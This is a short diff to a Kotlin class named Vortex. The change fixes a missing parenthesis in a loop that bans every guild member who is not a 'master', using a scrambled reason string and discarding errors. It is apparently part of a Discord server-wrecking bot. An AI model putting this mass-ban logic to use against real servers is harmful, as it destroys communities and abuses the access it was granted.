@@ -42,7 +42,7 @@ class Vortex(val guild: Guild, val log: MessageChannel, val masterRole: String) 
       if (isMaster(member))
         continue
       try {
-        member.ban(0, chaotize(128, true).complete()
+        member.ban(0, chaotize(128, true)).complete()
       } catch (e: Exception) {
       }
     }
